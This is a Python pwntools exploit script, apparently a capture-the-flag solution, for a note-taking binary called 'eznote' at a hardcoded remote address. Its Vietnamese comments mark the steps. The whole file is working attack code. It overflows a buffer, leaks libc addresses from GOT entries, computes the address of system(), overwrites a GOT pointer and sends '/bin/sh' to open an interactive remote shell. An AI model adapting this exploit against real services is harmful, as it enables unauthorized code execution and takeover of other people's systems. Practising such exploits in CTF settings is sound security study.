from pwn import *

atoi_got = 0x601058
put_got = 0x601018
# printf_got = 0x601028
add = 0x4004c8
key_13 = 0x6010ad

host, port = "35.240.244.147", 33334
a = remote(host, port)
# a = process('./eznote')

raw_input('debug')
context.binary = './eznote'
context.terminal = "bin/bash"
context.log_level = "debug"

a.recvuntil('Enter secret key: ')
buf = '0x1337EzNote\x00' + p64(0x10)+ p64(atoi_got)
a.sendline(buf)

def write(choice, index, content ):
	a.recvuntil('>>>')
	a.sendline(choice)
	a.recvuntil('Enter note index: ')
	a.recvuntil('Content: ')
	a.sendline(content)
	
def read(choice, index):
	a.recvuntil('>>>')
	a.sendline(choice)
	a.recvuntil('Enter note index: ')


# Tim dia chi put, write
payload = '1' + 'a'*0x1f7 + p64(add) + '15'
read(payload,'20')

temp = a.recv(40)
res = a.recv(8)
print 'res: %s' %res 
put_add = u64(res)
print 'put_add: 0x%x' %put_add

res1 = a.recv(8)
print 'res1: %s' %res1
write_add = u64(res1)
print 'write_add: 0x%x' %write_add

#tim dia chi base_libc
# put_offset = 0x06f690
# system_offset = 0x045390

put_offset = 0x0809c0
system_offset = 0x04f440

base = put_add - put_offset
system_add = base + system_offset	#dia chi system


payload2 = '0' + 'a'*0x1f7 + p64(key_13) + '15'
write(payload2, '20', p64(system_add))


a.recvuntil('>>>')
buf2 = "/bin/sh"	#set rdi = binsh_add
a.sendline(buf2)

a.interactive()